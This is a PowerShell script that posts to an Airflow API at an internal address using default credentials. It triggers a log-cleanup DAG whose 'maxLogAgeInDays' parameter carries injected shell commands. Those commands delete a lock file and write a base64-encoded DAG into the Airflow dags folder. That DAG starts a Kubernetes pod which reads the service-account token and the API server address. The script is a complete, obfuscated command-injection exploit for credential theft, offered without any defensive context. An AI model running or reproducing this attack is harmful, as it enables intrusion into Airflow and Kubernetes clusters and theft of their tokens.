$cred = [Convert]::ToBase64String([Text.Encoding]::ASCII.GetBytes("airflow:airflow"))
$headers = @{
    Authorization = "Basic $cred"
    "Content-Type" = "application/json"
}
$body = '{"conf":{"maxLogAgeInDays":"1;rm -f /tmp/airflow_log_cleanup_worker.lock;echo ZnJvbSBhaXJmbG93IGltcG9ydCBEQUcKZnJvbSBhaXJmbG93LnByb3ZpZGVycy5jbmNmLmt1YmVybmV0ZXMub3BlcmF0b3JzLnBvZCBpbXBvcnQgS3ViZXJuZXRlc1BvZE9wZXJhdG9yCmZyb20gZGF0ZXRpbWUgaW1wb3J0IGRhdGV0aW1lCndpdGggREFHKGRhZ19pZD0iazhzX3Rva2VuX2dyYWIiLHN0YXJ0X2RhdGU9ZGF0ZXRpbWUoMjAyNCwxLDEpLHNjaGVkdWxlPU5vbmUsY2F0Y2h1cD1GYWxzZSx0YWdzPVsiazhzIl0pIGFzIGRhZzoKICAgIGdyYWI9S3ViZXJuZXRlc1BvZE9wZXJhdG9yKHRhc2tfaWQ9ImdyYWJfdG9rZW4iLG5hbWU9ImFmLWdyYWIiLG5hbWVzcGFjZT0iZGVmYXVsdCIsaW1hZ2U9ImJ1c3lib3g6bGF0ZXN0IixjbWRzPVsic2giLCItYyJdLGFyZ3VtZW50cz1bImVjaG8gU0FfVE9LRU5fU1RBUlQ7Y2F0IC92YXIvcnVuL3NlY3JldHMva3ViZXJuZXRlcy5pby9zZXJ2aWNlYWNjb3VudC90b2tlbjtlY2hvO2VjaG8gU0FfVE9LRU5fRU5EO2VjaG8gSzhTX0hPU1Q7ZWNobyAkS1VCRVJORVRFU19TRVJWSUNFX0hPU1Q6JEtVQkVSTkVURVNfU0VSVklDRV9QT1JUO2VjaG8gRE9ORSJdLGlzX2RlbGV0ZV9vcGVyYXRvcl9wb2Q9VHJ1ZSxnZXRfbG9ncz1UcnVlLGluX2NsdXN0ZXI9VHJ1ZSxzdGFydHVwX3RpbWVvdXRfc2Vjb25kcz0zMDAp|base64 -d>/opt/airflow/dags/k8s_token_grab.py;echo DAGWRITTEN;#"},"note":"inject"}'
try {
    $r = Invoke-WebRequest -Uri "http://10.9.100.198:8080/api/v1/dags/maintenance_logs_cleanup/dagRuns" -Method POST -Headers $headers -Body $body -UseBasicParsing -TimeoutSec 15
    Write-Output ("TRIGGERED: " + ($r.Content | ConvertFrom-Json).dag_run_id)
} catch {
    Write-Output ("ERROR: " + $_.Exception.Message)
}
